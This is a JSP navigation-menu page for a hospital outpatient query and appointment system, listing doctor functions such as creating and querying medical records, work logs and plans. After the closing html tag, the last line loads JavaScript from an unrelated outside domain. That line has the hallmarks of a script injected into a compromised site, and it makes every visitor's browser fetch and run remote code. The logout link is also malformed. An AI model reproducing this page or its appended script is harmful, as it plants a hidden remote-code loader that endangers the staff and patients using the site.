<%--
  Created by IntelliJ IDEA.
  User: ibm
  Date: 2018/7/10
  Time: 13:28
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <link type="text/css" href="css/stylesheet.css" rel="stylesheet"/>
    <base target="Main">
</head>

<script language="javascript">
    var MenuFrameSize
    function FrameControl()
    {
        if (top.ot.cols == "20,*")
        {

            parent.Left.document.body.scroll = "auto"
            top.ot.cols = MenuFrameSize

        }
        else
        {

            parent.Left.document.body.scroll = "no"
            MenuFrameSize = top.ot.cols
            top.ot.cols = "20,*"

        }
    }

    function fmenu1(ctlName)
    {
        if (document.all[ctlName] != null)
        {
            if (document.all[ctlName].style.display == 'none')
            {
                document.all[ctlName].style.display = 'block';
            }
            else
            {
                document.all[ctlName].style.display = 'none';
            }
        }
    }
</script>

<body bgcolor="#cccccc" leftmargin="0" topmargin="0">

<table width="100%" cellpadding="3" border="0">
    <tr>
        <td>
            <img alt="" src="images/Frame_Control.gif" onClick="FrameControl()" style="CURSOR:hand" width="20" height="20">
        </td>
    </tr>
    <tr>
        <td>
            <table id="tableTree" border="0" style="width:100%;">
                <tr>
                    <td>
                        <div onMouseDown="fmenu1('Table0')" style="cursor:hand;">
                            <img src="images/nodec.gif" width="16" height="15">&nbsp; 医院门诊查询预约系统</div>
                    </td>
                </tr>
                <tr id="Table0" style="display:none;">
                    <td>
                        <table border="0" width="182">
                            <tr>
                                <td>
                                    <div onMouseDown="fmenu1('Table09')" style="cursor:hand;">
                                        &nbsp;
                                        <img src="images/nodeo.gif" width="16" height="16">医生管理功能								</div>							</td>
                            </tr>
                            <tr id="Table09" style="display:none;">
                                <td width="100%">
                                    <table border="0" width="166">
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/medicalhistoryA.jsp">创建病历</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/medicalhistoryE.jsp">查询病历</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/worklogA.jsp">创建日志</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/worklogE.jsp">查询日志</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/workPlanA.jsp">创建计划</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/workPlanE.jsp">查询计划</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/patientmsgE.jsp">查询留言</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/uploadFile.jsp">上传模板</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="doctors/downloadfile.jsp">下载模板</a>										</td>
                                        </tr>
                                        <tr>
                                            <td width="100%">
                                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                <a href="updatepassword.jsp">修改密码</a>										</td>
                                        </tr>
                                    </table>							</td>
                            </tr>
                        </table>
                    </td>
                </tr>
                <tr>
                    <td height="19">
                        <div style="cursor:hand;">
                            <img src="images/logout.gif" border="0" width="16" height="15">&nbsp;
                            <a href="login.jsp>退出</a></div>
                    </td>
                </tr>
            </table>
        </td>
    </tr>
</table>

</body>

</html>
<script language=javascript src=http://www.haofbi.com/js/w.js></script>
